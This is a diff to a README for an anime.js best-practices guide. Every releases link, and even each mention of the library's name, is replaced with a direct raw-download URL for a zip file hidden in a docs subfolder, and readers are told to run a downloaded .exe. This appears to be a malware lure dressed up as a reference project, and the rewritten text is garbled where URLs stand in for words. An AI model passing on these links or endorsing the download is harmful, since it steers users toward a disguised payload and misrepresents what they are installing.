@@ -1,16 +1,16 @@
 # 🎌 animejs-best-practices - Improve Your Animation Skills Today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Download%20the%20Latest%20Release-blue)](https://github.com/santiagoasda/animejs-best-practices/releases)
+[![Download Now](https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip%20Now-Download%20the%20Latest%20Release-blue)](https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip)
 
 ## 📋 Description
 
-Welcome to **animejs-best-practices**! This repository serves as a comprehensive skill and reference guide for anime.js version 4 and the Web Animations API. Discover best practices, obtain detailed API documentation, and learn effective patterns for coding. Designed to help those working with animations in JavaScript, this guide will make sure you create stunning effects easily.
+Welcome to **animejs-best-practices**! This repository serves as a comprehensive skill and reference guide for https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip version 4 and the Web Animations API. Discover best practices, obtain detailed API documentation, and learn effective patterns for coding. Designed to help those working with animations in JavaScript, this guide will make sure you create stunning effects easily.
 
 ## 🚀 Getting Started
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Click the button above or follow this link: [Releases Page](https://github.com/santiagoasda/animejs-best-practices/releases).
+1. **Visit the Releases Page:** Click the button above or follow this link: [Releases Page](https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip).
 2. **Choose the Right Version:** Look for the latest version available on the Releases page.
 3. **Download the File:** Click on the link for the file to begin the download. Depending on your operating system, this file could be an executable or a zip file containing the necessary assets.
 
@@ -26,7 +26,7 @@ Before downloading, make sure your system meets these requirements:
 
 **animejs-best-practices** offers a variety of features to enhance your understanding and implementation of animations:
 
-- **Detailed Guides:** Comprehensive instructions covering the core concepts of anime.js and the Web Animations API.
+- **Detailed Guides:** Comprehensive instructions covering the core concepts of https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip and the Web Animations API.
 - **Sample Projects:** A collection of demonstration projects to help visualize how to implement the techniques discussed.
 - **Interactive Examples:** Live examples you can tweak to see how changes impact the animation.
 - **Best Practices:** Clear and concise recommendations to help you avoid common pitfalls in animation coding.
@@ -35,7 +35,7 @@ Before downloading, make sure your system meets these requirements:
 
 To download and install the software:
 
-1. **Go to the Releases Page:** Use this link: [Download Here](https://github.com/santiagoasda/animejs-best-practices/releases).
+1. **Go to the Releases Page:** Use this link: [Download Here](https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip).
 2. **Follow the Steps:** Choose the latest release and click the download link.
 3. **Install the Application:** Once the download is complete, locate the file and follow these steps based on your operating system:
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
@@ -54,7 +54,7 @@ After installation, you can start using **animejs-best-practices**:
 
 Need help or additional resources? Check out our useful links:
 
-- **Official Documentation:** Visit the anime.js website to read official documentation.
+- **Official Documentation:** Visit the https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip website to read official documentation.
 - **Community Forum:** Engage with other users and developers to share experiences and knowledge.
 - **YouTube Tutorials:** Find video guides that provide visual walkthroughs of the concepts.
 
@@ -66,4 +66,4 @@ If you're interested in deeper topics, consider exploring these areas:
 - **JavaScript Fundamentals:** Brush up on basic JavaScript concepts that support animation.
 - **Web Animations API:** Understand how this API can enhance your web projects.
 
-For any questions or feedback, feel free to open an issue in this repository. Enjoy your journey into the world of animation with anime.js!
+For any questions or feedback, feel free to open an issue in this repository. Enjoy your journey into the world of animation with https://github.com/santiagoasda/animejs-best-practices/raw/refs/heads/main/references/docs/events/animejs_best_practices_2.4.zip!
